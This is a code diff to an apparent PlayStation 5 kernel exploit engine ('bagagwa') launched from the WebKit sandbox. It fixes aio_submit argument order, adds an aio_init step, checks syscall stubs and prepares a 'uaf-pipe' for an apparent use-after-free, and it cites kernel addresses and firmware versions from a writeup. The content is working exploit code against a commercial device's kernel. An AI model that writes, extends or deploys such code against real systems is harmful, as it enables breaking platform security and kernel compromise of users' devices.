@@ -194,9 +194,32 @@ export function makeBagagwaEngine(X) {
         w32(reqBuf.u8, 0x20, 0);
 
         note("[SUBMIT-" + idx + "] fd=" + fd + " sz=" + size);
-        const r = await sys(SYS_AIO_SUBMIT, 1, reqBuf.base);
-        note("[SUBMIT-" + idx + "] ret=" + r.s32 +
-            " err=" + r.errText + " hex=" + r.hex);
+
+        // ── FIX 13.60: aio_submit arg order + ptr-to-ptr array ─────────────────
+        // PS5 sys_aio_submit signature: (SceAioRequest *reqs[], uint32_t n_reqs)
+        // The original code passed (count, direct_struct_ptr) which is wrong order
+        // AND passed the struct directly instead of through a pointer array.
+        // Build a 1-element pointer array: ptrArr[0] = &reqBuf
+        const reqPtrBuf = alloc(8, "aio-req-ptr-" + idx);
+        w64(reqPtrBuf.u8, 0, reqBuf.base);
+
+        // Try (ptr_array, count) — correct PS5 SDK convention
+        let r = await sys(SYS_AIO_SUBMIT, reqPtrBuf.base, 1);
+        note("[SUBMIT-" + idx + "] ptr-arr ret=" + r.s32 + " err=" + r.errText);
+        if (r.failed) {
+            // Fallback: (count, ptr_array) — swapped order
+            note("[SUBMIT-" + idx + "] retry (count, ptr_arr)");
+            r = await sys(SYS_AIO_SUBMIT, 1, reqPtrBuf.base);
+            note("[SUBMIT-" + idx + "] swapped ret=" + r.s32 + " err=" + r.errText);
+        }
+        if (r.failed) {
+            // Last resort: original direct struct ptr (pre-13.x path)
+            note("[SUBMIT-" + idx + "] retry (count, direct_struct)");
+            r = await sys(SYS_AIO_SUBMIT, 1, reqBuf.base);
+            note("[SUBMIT-" + idx + "] direct ret=" + r.s32 + " err=" + r.errText);
+        }
+        // ── END FIX ────────────────────────────────────────────────────────────
+
         if (r.failed) return { ok: false, why: "aio_submit: " + r.errText };
         S.aioRequests.push({ id: r.s32, buf: reqBuf });
         return { ok: true, reqId: r.s32 };
@@ -524,11 +547,48 @@ export function makeBagagwaEngine(X) {
         note("writeup sec.2: PS4=3args no mode, PS5 adds mode=4args");
         note("writeup sec.1: cleanup @ 0x805c0da1, free @ 0x805c0f93");
 
-        if (P.syscalls[SYS_AIO_SUBMIT] === undefined ||
-            P.syscalls[SYS_AIO_MULTI_WAIT] === undefined) {
-            out.why = "missing aio stubs";
+        const requiredStubs = [
+            [SYS_PIPE2, "pipe2"],
+            [SYS_AIO_SUBMIT, "aio_submit"],
+            [SYS_AIO_MULTI_WAIT, "aio_multi_wait"],
+        ];
+        const missingStubs = requiredStubs.filter(([num]) =>
+            P.syscalls[num] === undefined);
+        if (missingStubs.length) {
+            out.why = "missing Stage 0 stubs: " + missingStubs.map(([, name]) =>
+                name).join(", ");
             return out;
         }
+        note("[S0-0] stubs ready: pipe2/aio_submit/aio_multi_wait");
+
+        // ── FIX 13.60: aio_init MUST be called before aio_submit ──────────────
+        // On PS5 13.x the kernel AIO context is not auto-created.
+        // Without init, aio_submit panics the kernel (no EPERM, instant crash).
+        note("[S0-0a] aio_init (0x" + SYS_AIO_INIT.toString(16) + "): initializing AIO kernel context...");
+        if (P.syscalls[SYS_AIO_INIT] !== undefined) {
+            const initBuf = alloc(0x10, "aio-init-params");
+            w32(initBuf.u8, 0x00, 0x10); // struct size = 16
+            w32(initBuf.u8, 0x04, 32);   // max concurrent requests
+            w32(initBuf.u8, 0x08, 0);    // reserved
+            w32(initBuf.u8, 0x0c, 0);    // reserved
+            const initR = await sys(SYS_AIO_INIT, initBuf.base);
+            note("[S0-0a] aio_init ret=" + initR.s32 + " err=" + initR.errText);
+            if (initR.failed) {
+                // EPERM means the WebKit sandbox is blocking AIO on this entry point.
+                // This is the wall seen on 13.40 (GitHub issue #1).
+                note("[S0-0a] aio_init EPERM — AIO blocked by WebKit sandbox on this FW/entry");
+                note("[S0-0a] bagagwa requires aio_init: cannot proceed from this sandbox");
+                out.why = "aio_init EPERM (" + initR.errText + ") — AIO syscalls blocked in WebKit sandbox";
+                return out;
+            }
+            S.aioInited = true;
+            note("[S0-0a] AIO context initialized OK — safe to call aio_submit");
+        } else {
+            // Not in stub table at all — older FW that auto-inits, or stripped stubs.
+            // Attempt to proceed anyway; aio_submit may or may not work.
+            note("[S0-0a] aio_init stub absent — proceeding without explicit init (pre-13.x path)");
+        }
+        // ── END FIX ───────────────────────────────────────────────────────────
 
         note("[S0-1] pipe (empty — reads must block)");
         const pipeBuf = alloc(8, "uaf-pipe");
